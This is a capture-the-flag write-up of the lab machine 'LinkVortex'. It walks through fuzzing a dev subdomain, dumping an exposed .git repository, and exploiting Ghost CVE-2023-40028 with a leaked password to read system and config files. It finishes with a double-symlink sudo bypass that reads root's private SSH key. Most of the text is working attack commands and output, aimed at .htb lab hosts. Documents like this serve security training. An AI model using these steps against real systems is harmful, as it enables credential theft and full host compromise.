---
title: "LinkVortex"
---

![Cap dashboard screenshot](linkvortex.png)

LinkVortex is an easy Linux machine featuring virtual host enumeration, exposed Git repository, Ghost CMS exploitation, and symlink-based privilege escalation.

## Reconnaissance

I started with a standard TCP port scan:

```text
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp    open     http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
```

Port 80 redirected to `linkvortex.htb`, so I added it to my `/etc/hosts` file.

## Initial Access

![Cap dashboard screenshot](linkvortex-1.png)

The main site was a Ghost-powered blog for "BitByBit Hardware" with posts authored by `admin`. Virtual host enumeration revealed a development subdomain:

```bash
ffuf -H 'Host: FUZZ.linkvortex.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://linkvortex.htb -fs 230
```

```text
dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 36ms]
```

The `dev.linkvortex.htb` site showed a "Launching soon" message. Directory fuzzing discovered an exposed `.git` directory:

```bash
ffuf -u "http://dev.linkvortex.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
```

```text
.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 34ms]
```

I used `git-dumper` to extract the full repository:

```bash
git-dumper http://dev.linkvortex.htb/.git/ dev
```

```text
[-] Testing http://dev.linkvortex.htb/.git/HEAD 
[-] Testing http://dev.linkvortex.htb/.git/ 
[-] Fetching .git recursively
--- SNIP ---
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack 
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```

The repository was on Ghost `v5.58.0` branch with uncommitted changes:

```bash
git status
```

```text
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

Examining the diff revealed a hardcoded password:

```bash
git diff HEAD^ ghost/core/test/regression/api/admin/authentication.test.js
```

```text
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {

        it('complete setup', async function () {
            const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';

            const requestMock = nock('https://api.github.com')
```

Ghost 5.58.0 is vulnerable to **CVE-2023-40028** https://github.com/0xyassine/CVE-2023-40028 (authenticated arbitrary file read). Searching the repository found one email reference:

```bash
/bin/grep -ri linkvortex.htb
```

```text
.git/logs/HEAD:0000000000000000000000000000000000000000 299cdb4387763f850887275a716153e84793077d root <dev@linkvortex.htb> 1730322603 +0000     clone: from https://github.com/TryGhost/Ghost.git
```

Testing `admin@linkvortex.htb:OctopiFociPilfer45` worked with the CVE PoC:

```bash
bash CVE-2023-40028.sh -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45'
```

```text
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
--- SNIP ---
node:x:1000:1000::/home/node:/bin/bash
```

The Dockerfile revealed the Ghost config location:

```text
Dockerfile.ghost
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json
```

I used the exploit to read the config:

```bash
# (Using CVE-2023-40028 shell)
file> /var/lib/ghost/config.production.json
```

```json
{
  "url": "http://localhost:2368",
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

The credentials `bob:fibber-talented-worth` worked via SSH:

```bash
ssh bob@linkvortex.htb
```

## Privilege Escalation

Checking sudo permissions revealed an interesting script:

```bash
sudo -l
```

```text
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

The script checked PNG files for malicious symlinks:

```bash
cat /opt/ghost/clean_symlink.sh
```

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

**Method 1 - Double Symlink**: The script only checks the immediate link target once. I created a chain:

```bash
ln -s /root/ spicy
ln -s /dev/shm/spicy/.ssh/id_rsa key.png
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /dev/shm/key.png
```

```text
Link found [ /dev/shm/key.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
--- SNIP ---
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

The root SSH key worked immediately:

```bash
ssh -i key root@linkvortex.htb
```

## Attack Path

- **Port scan** — identify SSH and HTTP redirect to `linkvortex.htb`.
- **Virtual host enum** — discover `dev.linkvortex.htb` subdomain.
- **Directory fuzzing** — find exposed `.git` directory on dev site.
- **Git dump** — extract full repository with `git-dumper`.
- **Source review** — find Ghost 5.58.0 and password `OctopiFociPilfer45` in test file.
- **Ghost CVE-2023-40028** — exploit authenticated file read with `admin@linkvortex.htb`.
- **Config extraction** — read `/var/lib/ghost/config.production.json` for SSH credentials.
- **SSH as bob** — login with `bob:fibber-talented-worth`.
- **Sudo enumeration** — identify `clean_symlink.sh` script permissions.
- **Double symlink bypass** — chain symlinks to read root SSH key.
- **Root access** — connect with private key for final flag.
